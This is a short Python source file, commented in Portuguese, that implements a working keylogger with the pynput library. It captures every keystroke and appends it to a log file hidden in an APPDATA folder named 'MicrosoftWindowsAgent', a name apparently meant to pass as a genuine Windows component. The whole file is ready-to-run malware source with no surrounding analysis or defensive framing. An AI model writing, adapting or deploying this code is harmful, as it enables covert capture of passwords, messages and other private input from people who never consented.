from pynput.keyboard import Key, Listener
from os import getenv, path, makedirs

# Diretório e arquivo para salvar o log
file_local_save = getenv('APPDATA')
log_dir = path.join(file_local_save, "MicrosoftWindowsAgent")
log_file = path.join(log_dir, "log000.txt")

# Cria o diretório, se não existir
if not path.exists(log_dir):
    makedirs(log_dir)


def on_press(key):
    """
    Função chamada ao pressionar uma tecla.
    """
    try:
        with open(log_file, "a") as log:
            try:
                log.write(f"{key.char}")
            except AttributeError:  # Trata teclas especiais
                if key == Key.space:
                    log.write(" ")
                elif key == Key.enter:
                    log.write("\n<Enter>\n")
                else:
                    log.write(f"\n<{key}>\n")
    except Exception as e:
        print(f"Erro ao escrever no arquivo de log: {e}")


def start_keylogger():
    """
    Inicia o keylogger.
    """
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    start_keylogger()
